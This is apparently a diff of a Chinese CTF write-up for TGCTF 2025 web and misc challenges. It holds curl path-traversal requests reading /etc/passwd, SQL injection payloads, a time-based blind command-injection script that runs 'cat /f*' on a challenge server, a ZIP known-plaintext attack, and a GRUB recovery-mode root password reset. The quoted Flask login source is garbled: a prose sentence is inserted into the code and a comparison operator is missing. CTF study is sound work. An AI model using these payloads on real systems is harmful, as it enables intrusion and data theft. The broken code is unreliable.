 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">访问<span class="hljs-regexp">/@fs/</span>tmp<span class="hljs-regexp">/获得绝对路径/</span>app，同时给了附件看docker也能看出路径<br><br>curl --request-target <span class="hljs-regexp">/@fs/</span>app<span class="hljs-regexp">/#/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/etc/</span>passwd http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">58664</span>/<br>curl --request-target <span class="hljs-regexp">/@fs/</span>app<span class="hljs-regexp">/#/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/tgflagggg http:/</span><span class="hljs-regexp">/127.0.0.1:58664/</span><br></code></pre></td></tr></table></figure>
 
 <hr>
-<h1 id="TGCTF2025-后台管理"><a href="#TGCTF2025-后台管理" class="headerlink" title="TGCTF2025 后台管理"></a>TGCTF2025 后台管理</h1><p>源码</p>
+<h2 id="TGCTF2025-后台管理"><a href="#TGCTF2025-后台管理" class="headerlink" title="TGCTF2025 后台管理"></a>TGCTF2025 后台管理</h2><p>源码</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, redirect, render_template,<br>render_template_string<br><span class="hljs-keyword">import</span> pymysql.cursors<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">db</span>():<br>    <span class="hljs-keyword">return</span> pymysql.connect(<br>        host=os.environ[<span class="hljs-string">&quot;MYSQL_HOST&quot;</span>],<br>        user=os.environ[<span class="hljs-string">&quot;MYSQL_USER&quot;</span>],<br>        password=os.environ[<span class="hljs-string">&quot;MYSQL_PASSWORD&quot;</span>],<br>        database=os.environ[<span class="hljs-string">&quot;MYSQL_DATABASE&quot;</span>],<br>        charset=<span class="hljs-string">&quot;utf8mb4&quot;</span>,<br>        cursorclass=pymysql.cursors.DictCursor,<br>   )<br>   <br>app = Flask(name)<br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;username&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> request.cookies:<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&quot;/login&quot;</span>)<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>, username=request.cookies[<span class="hljs-string">&quot;username&quot;</span>])<br>    <br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/login&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>可以在参数中使用 \ 来转义字符串从而绕开引号的限制，剩下的就很简单了。<br>    <span class="hljs-keyword">if</span> request.method  <span class="hljs-string">&quot;POST&quot;</span>:<br>        username = request.form.get(<span class="hljs-string">&quot;username&quot;</span>)<br>        password = request.form.get(<span class="hljs-string">&quot;password&quot;</span>)<br>        <span class="hljs-keyword">if</span> username <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">or</span> password <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;要输入账号密码喔~&quot;</span>, <span class="hljs-number">400</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(username) &gt; <span class="hljs-number">64</span> <span class="hljs-keyword">or</span> <span class="hljs-built_in">len</span>(password) &gt; <span class="hljs-number">64</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;哈~太长了，受不了了~&quot;</span>, <span class="hljs-number">400</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;&#x27;&quot;</span> <span class="hljs-keyword">in</span> username <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;&#x27;&quot;</span> <span class="hljs-keyword">in</span> password:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;杂鱼，还想SQL注入？爬！&quot;</span>, <span class="hljs-number">400</span><br>            <br>        conn = <span class="hljs-literal">None</span><br>        <span class="hljs-keyword">try</span>:<br>            conn = db()<br>            <span class="hljs-keyword">with</span> conn.cursor() <span class="hljs-keyword">as</span> cursor:<br>                cursor.execute(<br>                    <span class="hljs-string">f&quot;SELECT * FROM users WHERE username = &#x27;<span class="hljs-subst">&#123;username&#125;</span>&#x27; AND</span><br><span class="hljs-string">password = &#x27;<span class="hljs-subst">&#123;password&#125;</span>&#x27;&quot;</span><br>               )<br>                user = cursor.fetchone()<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;Error: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>, <span class="hljs-number">500</span><br>        <span class="hljs-keyword">finally</span>:<br>            <span class="hljs-keyword">if</span> conn <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>                conn.close()<br>        <span class="hljs-keyword">if</span> user <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;username&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> user:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;账号密码错误&quot;</span>, <span class="hljs-number">400</span><br>        response = redirect(<span class="hljs-string">&quot;/&quot;</span>)<br>       response.set_cookie(<span class="hljs-string">&quot;username&quot;</span>, user[<span class="hljs-string">&quot;username&quot;</span>])<br>        <span class="hljs-keyword">return</span> response<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;login.html&quot;</span>)<br></code></pre></td></tr></table></figure>
 
 <p>可以在参数中使用 \ 来转义字符串从而绕开引号的限制然后使用报错注入。并且引号被过滤了，所以报错注入中的’~’可以改为null，就不需要单引号了。</p>
 <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">username=\&amp;<span class="hljs-keyword">password</span>=<span class="hljs-keyword">and</span> updatexml(<span class="hljs-keyword">null</span>,concat((<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> flag)),<span class="hljs-keyword">null</span>)<span class="hljs-comment">--+</span><br><br>username=\&amp;<span class="hljs-keyword">password</span>=<span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> *,<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> flag#<br></code></pre></td></tr></table></figure>
 
 <hr>
-<h1 id="TG-wordpress"><a href="#TG-wordpress" class="headerlink" title="TG_wordpress"></a><strong>TG_wordpress</strong></h1><p>Sample Page发现小记，可以知道前台有多个方向漏洞。 </p>
+<h2 id="TG-wordpress"><a href="#TG-wordpress" class="headerlink" title="TG_wordpress"></a><strong>TG_wordpress</strong></h2><p>Sample Page发现小记，可以知道前台有多个方向漏洞。 </p>
 <p>这里我就写个MISC方向的漏洞</p>
 <p><strong>logo另存为图片，jphide可以找到hint。</strong></p>
 <p>hint内容：</p>
@@ -1772,7 +1859,7 @@
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">TGCTF</span>&#123;CVE-<span class="hljs-number">2020</span>-<span class="hljs-number">25213</span>&#125;<br></code></pre></td></tr></table></figure>
 
 <hr>
-<h1 id="熟悉的配方，熟悉的味道"><a href="#熟悉的配方，熟悉的味道" class="headerlink" title="熟悉的配方，熟悉的味道"></a><strong>熟悉的配方，熟悉的味道</strong></h1><p>源码</p>
+<h2 id="熟悉的配方，熟悉的味道"><a href="#熟悉的配方，熟悉的味道" class="headerlink" title="熟悉的配方，熟悉的味道"></a><strong>熟悉的配方，熟悉的味道</strong></h2><p>源码</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pyramid.config <span class="hljs-keyword">import</span> Configurator<br><span class="hljs-keyword">from</span> pyramid.request <span class="hljs-keyword">import</span> Request<br><span class="hljs-keyword">from</span> pyramid.response <span class="hljs-keyword">import</span> Response<br><span class="hljs-keyword">from</span> pyramid.view <span class="hljs-keyword">import</span> view_config<br><span class="hljs-keyword">from</span> wsgiref.simple_server <span class="hljs-keyword">import</span> make_server<br><span class="hljs-keyword">from</span> pyramid.events <span class="hljs-keyword">import</span> NewResponse<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> jinja2 <span class="hljs-keyword">import</span> Environment, BaseLoader<br><br>eval_globals = &#123; <span class="hljs-comment">#防止eval执行恶意代码</span><br>    <span class="hljs-string">&#x27;__builtins__&#x27;</span>: &#123;&#125;,      <span class="hljs-comment"># 禁用所有内置函数</span><br>    <span class="hljs-string">&#x27;__import__&#x27;</span>: <span class="hljs-literal">None</span>       <span class="hljs-comment"># 禁止动态导入</span><br>&#125;<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">checkExpr</span>(<span class="hljs-params">expr_input</span>):<br>    expr = re.split(<span class="hljs-string">r&quot;[-+*/]&quot;</span>, expr_input)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">exec</span>(expr_input))<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(expr) != <span class="hljs-number">2</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-built_in">int</span>(expr[<span class="hljs-number">0</span>])<br>        <span class="hljs-built_in">int</span>(expr[<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">home_view</span>(<span class="hljs-params">request</span>):<br>    expr_input = <span class="hljs-string">&quot;&quot;</span><br>    result = <span class="hljs-string">&quot;&quot;</span><br><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        expr_input = request.POST[<span class="hljs-string">&#x27;expr&#x27;</span>]<br>        <span class="hljs-keyword">if</span> checkExpr(expr_input):<br>            <span class="hljs-keyword">try</span>:<br>                result = <span class="hljs-built_in">eval</span>(expr_input, eval_globals)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                result = e<br>        <span class="hljs-keyword">else</span>:<br>            result = <span class="hljs-string">&quot;爬！&quot;</span><br><br><br>    template_str = 【xxx】<br><br>    env = Environment(loader=BaseLoader())<br>    template = env.from_string(template_str)<br>    rendered = template.render(expr_input=expr_input, result=result)<br>    <span class="hljs-keyword">return</span> Response(rendered)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">with</span> Configurator() <span class="hljs-keyword">as</span> config:<br>        config.add_route(<span class="hljs-string">&#x27;home_view&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>)<br>        config.add_view(home_view, route_name=<span class="hljs-string">&#x27;home_view&#x27;</span>)<br>        app = config.make_wsgi_app()<br><br>    server = make_server(<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-number">9040</span>, app)<br>    server.serve_forever()<br></code></pre></td></tr></table></figure>
 
 <p>比赛时候想到了要利用exec无回显命令执行，但是不知道怎么利用。题解说是打内存马</p>
@@ -1792,6 +1879,87 @@
 
 <p>另一个脚本（这个更稳定，也更难看懂）</p>
 <figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs vim">import requests<br>import time<br><br>def cmd(cmd):<br>    url = <span class="hljs-string">&quot;http://node1.tgctf.woooo.tech:32142/&quot;</span><br>    # url = <span class="hljs-string">&quot;http://127.0.0.1:9040/&quot;</span><br>    result = <span class="hljs-string">&quot;&quot;</span><br><br>    <span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>        flag = True<br>        <span class="hljs-keyword">left</span> = <span class="hljs-number">33</span><br>        <span class="hljs-keyword">right</span> = <span class="hljs-number">126</span><br><br>        <span class="hljs-keyword">while</span> True:<br>            data = &#123;<br>                <span class="hljs-string">&quot;expr&quot;</span>: <span class="hljs-keyword">f</span><span class="hljs-string">&#x27;a=__import__(&quot;os&quot;).popen(&quot;&#123;cmd&#125;&quot;).read()\nif(ord(a[&#123;i&#125;])&lt;&#123;(left+right)//2&#125;):__import__(&quot;time&quot;).sleep(1)&#x27;</span><br>            &#125;<br>            <span class="hljs-keyword">if</span> flag:<br>                <span class="hljs-keyword">try</span>:<br>                    <span class="hljs-keyword">res</span> = requests.post(url, data=data)<br>                except Exception <span class="hljs-keyword">as</span> err:<br>                    pass<br>                # <span class="hljs-keyword">print</span>(<span class="hljs-keyword">res</span>.text)<br>                flag = False<br><br>            start = time.time()<br><br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-keyword">res</span> = requests.post(url, data=data)<br>            except Exception <span class="hljs-keyword">as</span> <span class="hljs-keyword">e</span>:<br>                <span class="hljs-keyword">print</span>(<span class="hljs-keyword">e</span>)<br>                i -= <span class="hljs-number">1</span><br>                <span class="hljs-keyword">continue</span><br><br>            end = time.time()<br>            <span class="hljs-keyword">print</span>(<span class="hljs-keyword">left</span>, <span class="hljs-keyword">right</span>, (<span class="hljs-keyword">left</span>+<span class="hljs-keyword">right</span>)//<span class="hljs-number">2</span>, end-start)<br>            <br>            <span class="hljs-keyword">if</span> end - start &gt; <span class="hljs-number">1</span>:<br>                <span class="hljs-keyword">right</span> = (<span class="hljs-keyword">left</span>+<span class="hljs-keyword">right</span>)//<span class="hljs-number">2</span>-<span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">left</span> = (<span class="hljs-keyword">left</span>+<span class="hljs-keyword">right</span>)//<span class="hljs-number">2</span>+<span class="hljs-number">1</span><br><br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">left</span> &gt; <span class="hljs-keyword">right</span>:<br>                # <span class="hljs-keyword">print</span>(chr(<span class="hljs-keyword">left</span>-<span class="hljs-number">1</span>), end=<span class="hljs-string">&quot;&quot;</span>)<br>                result += chr(<span class="hljs-keyword">left</span>-<span class="hljs-number">1</span>)<br>                <span class="hljs-keyword">print</span>(result)<br>                <span class="hljs-keyword">break</span><br><br><br>cmd(<span class="hljs-string">&#x27;cat /f*&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="ez-zip"><a href="#ez-zip" class="headerlink" title="ez_zip"></a>ez_zip</h2><h3 id="明文攻击"><a href="#明文攻击" class="headerlink" title="明文攻击"></a>明文攻击</h3><p>明文攻击是一种较为高效的攻击手段，大致原理是当你不知道一个zip的密码，但是你有zip中的一个已知文件（文件大小要大于12Byte）或者已经通过其他手段知道zip加密文件中的某些内容时，因为同一个zip压缩包里的所有文件都是使用同一个加密密钥来加密的，所以可以用已知文件来找加密密钥，利用密钥来解锁其他加密文件</p>
+<hr>
+<p>先把Victory_is_at_hand.zip下载下来，然发现要密码，爆破一下</p>
+<p><img src="/../image/TGCTF-2025%E5%A4%8D%E7%8E%B0-3.png"></p>
+<p>爆出密码20250412，将压缩包解压。</p>
+<p>第二步得到一个end压缩包和sh512.txt的文件，再看一看压缩包内，同样有一个相同名字的文件，优先考虑明文爆破，但是明文爆破是需要有已知明文的，这里我们发现sh512内的并非密文而是有意义的明文</p>
+<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-built_in">Awesome,</span>you_are_so_good<br></code></pre></td></tr></table></figure>
+
+<p>自然可以想到把内容进行sha512加密：</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">0894</span>fb<span class="hljs-number">7</span>edcf<span class="hljs-number">85585e8749</span>faeac<span class="hljs-number">3</span><span class="hljs-keyword">c</span><span class="hljs-number">7</span>adf<span class="hljs-number">4247</span>ae<span class="hljs-number">49</span>b<span class="hljs-number">50</span><span class="hljs-keyword">cc</span><span class="hljs-number">55</span><span class="hljs-keyword">c</span><span class="hljs-number">4</span>dd<span class="hljs-number">5</span>eead<span class="hljs-number">0</span>a<span class="hljs-number">9</span>be<span class="hljs-number">60</span>b<span class="hljs-number">7</span>d<span class="hljs-number">848</span>baece<span class="hljs-number">2</span>ee<span class="hljs-number">65273</span>d<span class="hljs-number">110317</span>be<span class="hljs-number">4</span>fe<span class="hljs-number">709</span><span class="hljs-keyword">c</span><span class="hljs-number">4</span>b<span class="hljs-number">2</span>bdeab<span class="hljs-number">48</span>a<span class="hljs-number">212</span>ca<span class="hljs-number">741e989</span>df<span class="hljs-number">39963</span><br></code></pre></td></tr></table></figure>
+
+<p>把加密内容写进文本文件后打包，当然压缩方式也需要和原始的压缩方式一致</p>
+<p>对照一下crc值：</p>
+<p><img src="/../image/TGCTF-2025%E5%A4%8D%E7%8E%B0-4.png"></p>
+<p>使用ARCHPR明文攻击</p>
+<p><img src="/../image/TGCTF-2025%E5%A4%8D%E7%8E%B0-5.png"></p>
+<p>得到解密之后的文件。</p>
+<p>解压得到一个flag压缩包，但是flag压缩包解压出错</p>
+<p>观察一下，发现文件名的长度有问题，修改一下，flag.txt长度应为8,改回08 00</p>
+<p><img src="/../image/TGCTF-2025%E5%A4%8D%E7%8E%B0-6.png"></p>
+<p>010中没有没有看到明文flag，但是压缩算法却为store，这里修改为DEFLATE</p>
+<p><img src="/../image/TGCTF-2025%E5%A4%8D%E7%8E%B0-7.png"></p>
+<p><img src="/../image/TGCTF-2025%E5%A4%8D%E7%8E%B0-8.png"></p>
+<p><img src="/../image/TGCTF-2025%E5%A4%8D%E7%8E%B0-9.png"></p>
+<p><img src="/../image/TGCTF-2025%E5%A4%8D%E7%8E%B0-10.png"></p>
+<p><img src="/../image/TGCTF-2025%E5%A4%8D%E7%8E%B0-11.png"></p>
+<p>其余的部分,<strong>压缩源文件数据区</strong>和<strong>压缩源文件目录区</strong>在文件头标记后,除了压缩源文件目录区</p>
+<p>多出一条压缩使用的版本 (2 bytes) ,即本题中重复出现的两次14 00,一直到文件名长度</p>
+<p>08 00,都是保持一致的,所以可以直接将压缩源文件数据区的十六进制数据复制填入压缩源</p>
+<p>文件目录区表示文件名长度的08 00前即可</p>
+<p><img src="/../image/TGCTF-2025%E5%A4%8D%E7%8E%B0-12.png"></p>
+<p>修改成功后解压拿到flag</p>
+<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">TGCTF</span><span class="hljs-template-variable">&#123;Warrior_You_have_defeated_the_giant_dragon!&#125;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs tap">一个 ZIP 文件由三个部分组成：<br>        压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志<br><br>    1、压缩源文件数据区<br><br>    在这个数据区中每一个压缩的源文件/目录都是一条记录，记录的格式如下：<br>      <br><br>       [文件头+ 文件数据 + 数据描述符]<br> <br>       a、文件头结构<br><br>         组成    　                长度<br>      文件头标记                 <span class="hljs-number"> 4 </span>bytes  (0x04034b50)<br>      解压文件所需 pkware 版本   <span class="hljs-number"> 2 </span>bytes<br>      全局方式位标记             <span class="hljs-number"> 2 </span>bytes<br>  　　压缩方式                   <span class="hljs-number"> 2 </span>bytes<br>  　　最后修改文件时间            <span class="hljs-number"> 2 </span>bytes<br> 　　 最后修改文件日期            <span class="hljs-number"> 2 </span>bytes<br> 　　 CRC-32校验                 <span class="hljs-number"> 4 </span>bytes<br> 　 　压缩后尺寸                 <span class="hljs-number"> 4 </span>bytes<br> 　 　未压缩尺寸                 <span class="hljs-number"> 4 </span>bytes<br> 　　 文件名长度                 <span class="hljs-number"> 2 </span>bytes<br><br>      扩展记录长度               <span class="hljs-number"> 2 </span>bytes<br> 　　 文件名                     （不定长度）<br> 　　 扩展字段                   （不定长度）<br><br>      <br><br>      <br>        b、文件数据<br><br><br>       <br><br>        c、数据描述符<br><br> 　　　组成    　长度<br>  　　CRC-32校验                 <span class="hljs-number"> 4 </span>bytes<br>  　　压缩后尺寸                  <span class="hljs-number"> 4 </span>bytes<br> 　 　未压缩尺寸                  <span class="hljs-number"> 4 </span>bytes<br><br>      这个数据描述符只在全局方式位标记的第３位设为１时才存在（见后详解），紧接在压缩数据的最后一个字节后。这个数据描述符只用在不能对输出的 ZIP 文件进行检索时使用。例如：在一个不能检索的驱动器（如：磁带机上）上的 ZIP 文件中。如果是磁盘上的ZIP文件一般没有这个数据描述符。<br><br>     2、压缩源文件目录区<br><br>     在这个数据区中每一条纪录对应在压缩源文件数据区中的一条数据<br><br><br>   　　　组成               　            长度<br>    　　目录中文件文件头标记            <span class="hljs-number"> 4 </span>bytes  (0x02014b50)<br>    　　压缩使用的　pkware 版本         <span class="hljs-number"> 2 </span>bytes<br>    　　解压文件所需 pkware 版本        <span class="hljs-number"> 2 </span>bytes<br>    　　全局方式位标记                  <span class="hljs-number"> 2 </span>bytes<br>    　　压缩方式                       <span class="hljs-number"> 2 </span>bytes<br>    　　最后修改文件时间                <span class="hljs-number"> 2 </span>bytes<br>    　　最后修改文件日期                <span class="hljs-number"> 2 </span>bytes<br>    　　ＣＲＣ－３２校验                <span class="hljs-number"> 4 </span>bytes<br>    　　压缩后尺寸                     <span class="hljs-number"> 4 </span>bytes<br>    　　未压缩尺寸                     <span class="hljs-number"> 4 </span>bytes<br>    　　文件名长度                     <span class="hljs-number"> 2 </span>bytes<br>    　　扩展字段长度                   <span class="hljs-number"> 2 </span>bytes<br>    　　文件注释长度                   <span class="hljs-number"> 2 </span>bytes<br>    　　磁盘开始号                     <span class="hljs-number"> 2 </span>bytes<br>    　　内部文件属性                   <span class="hljs-number"> 2 </span>bytes<br>    　　外部文件属性                   <span class="hljs-number"> 4 </span>bytes<br>        局部头部偏移量                 <span class="hljs-number"> 4 </span>bytes<br>    　　文件名                       （不定长度）<br>    　　扩展字段                     （不定长度）<br>        文件注释                     （不定长度）<br>    3、压缩源文件目录结束标志<br><br>    　　　组成               　          长度<br>        目录结束标记                   <span class="hljs-number"> 4 </span>bytes  (0x02014b50)<br>        当前磁盘编号                   <span class="hljs-number"> 2 </span>bytes<br>        目录区开始磁盘编号             <span class="hljs-number"> 2 </span>bytes<br>    　　本磁盘上纪录总数                <span class="hljs-number"> 2 </span>bytes<br>    　　目录区中纪录总数                <span class="hljs-number"> 2 </span>bytes<br>    　　目录区尺寸大小                  <span class="hljs-number"> 4 </span>bytes<br>    　　目录区对第一张磁盘的偏移量       <span class="hljs-number"> 4 </span>bytes<br>    　　ZIP 文件注释长度                <span class="hljs-number"> 2 </span>bytes<br>    　　ZIP 文件注释                   （不定长度）<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="TeamGipsy-ctfer"><a href="#TeamGipsy-ctfer" class="headerlink" title="TeamGipsy&amp;ctfer"></a><strong>TeamGipsy&amp;ctfer</strong></h2><p>1.其实这题很简单，给全了虚拟机配置文件，直接VM打开，发现要密 码，直接Linux登陆</p>
+<p>绕过 绕过方法：长按shift进入GRUB，选择advanced options for ubuntu，选择</p>
+<p>recovery mode，进入菜单 选择root，press enter，输入passwd hznuctfer，输入</p>
+<p>密码，重启（reboot）</p>
+<hr>
